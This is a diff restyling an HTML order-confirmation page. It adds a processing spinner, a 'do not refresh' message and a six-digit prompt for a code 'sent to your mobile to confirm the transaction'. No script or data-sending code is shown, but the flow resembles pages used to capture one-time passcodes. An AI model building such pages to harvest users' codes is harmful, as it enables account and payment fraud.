@@ -7,60 +7,124 @@
     <title>Thank You</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
-    <style>
-        /* Apple-like styling with black and white colors */
-        body, h1, h2, h4, p, label {
-            font-family: 'Montserrat', sans-serif;
-            color: #000; /* Changed to pure black */
-            background-color: #fff; /* Pure white background */
-        }
+   <style>
+    body, h1, h2, h4, p, label {
+        font-family: 'Montserrat', sans-serif;
+        color: #000; /* Black color text */
+        background-color: #f5f5f5; /* Light gray background */
+    }
 
-        .spinner-container,
-        .thanks-container,
-        .otp-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            text-align: center;
-            background-color: #fff;
-        }
+    .spinner-container,
+    .thanks-container,
+    .otp-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        text-align: center;
+        background-color: #f5f5f5;
+    }
 
-        .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.6); /* Darker border color */
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            border-left-color: #000; /* Black color for spinner */
-            animation: spin 10s ease-in-out infinite; /* Increased time to 10 seconds */
-            margin-bottom: 1rem;
-        }
+    .spinner {
+        border: 4px solid rgba(0, 0, 0, 0.1);
+        width: 50px;
+        height: 50px;
+        border-radius: 50%;
+        border-left-color: #000; /* Black color for spinner's left border */
+        animation: spin 0.5s linear infinite; /* Speeded up the animation */
+        margin-bottom: 1rem;
+    }
 
-        /* ... (other styles remain unchanged) ... */
-
-        .btn-2 {
-            background-color: #000; /* Black background for button */
-            color: #fff; /* White text */
-            padding: 10px 25px;
-            border: none;
-            border-radius: 3px;
-            margin-top: 25px;
-            cursor: pointer;
-            transition: background-color 0.3s;
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
         }
-
-        .btn-2:hover {
-            background-color: #333; /* Dark gray on hover */
+        100% {
+            transform: rotate(360deg);
         }
-    </style>
+    }
+
+    .otp-container-2 {
+        background-color: #fff; /* White background for OTP section */
+        padding: 20px;
+        border: 2px solid #d1d1d1; /* Gray border for OTP section */
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        border-radius: 5px;
+        width: 70%;
+    }
+
+    .otp-container-2 .otp-inputs {
+        display: flex;
+        justify-content: space-between;
+        max-width: 260px; /* Restrict the width to accommodate the 6 OTP fields in a line */
+        margin: 20px auto; /* Center the inputs */
+    }
+
+    .otp-container-2 .otp-inputs input {
+        border: 1px solid #aaa;
+        margin: 5px;
+        font-size: 22px;
+        background-color: #f9f9f9; /* Light gray background for input fields */
+        color: #555;
+        width: 35px;
+        height: 45px;
+        text-align: center;
+        border-radius: 3px;
+        transition: box-shadow 0.3s;
+    }
+
+    .otp-container-2 .otp-inputs input:focus {
+        box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
+    }
+
+    .btn-2 {
+        background-color: #9FE870;
+        color: #163300;
+        padding: 10px 25px;
+        border: none;
+        border-radius: 3px;
+        margin-top: 25px;
+        cursor: pointer;
+        transition: background-color 0.3s;
+    }
+
+    .btn-2:hover {
+        background-color: #73d636;
+    }
+
+    /* Hide the OTP and thank you sections initially */
+    .otp-container {
+        display: none;
+    }
+
+    .thanks-container {
+        display: none;
+    }
+
+    .thanks-container img {
+        width: 50%;
+        height: auto;
+        margin-bottom: 2rem;
+    }
+
+    .thanks-container h1 {
+        margin-bottom: 1.5rem;
+    }
+
+    .logo {
+        width: 60%;
+        margin-bottom: 20px;
+    }
+</style>
+
 </head>
 
 <body>
     <!-- Spinner Container -->
     <div class="spinner-container">
         <div class="spinner"></div>
-        <p>Order being processed... Please do not refresh the page.</p> <!-- Added 'do not refresh' message -->
+        <p>Order being processed... Please do not refresh the page.</p>
     </div>
 
     <!-- OTP Container -->
@@ -69,7 +133,7 @@
             <div class="col-md-6 otp-container otp-container-2">
                 <img src="path-to-your-logo.png" alt="Your Logo" class="logo">
                 <h2>Please Confirm</h2>
-                <p>Enter the code sent to your mobile to confirm the transaction:</p> <!-- Updated text -->
+                <p>Enter the code sent to your mobile to confirm the transaction:</p>
                 <div class="otp-inputs">
                     <input type="text" maxlength="1">
                     <input type="text" maxlength="1">
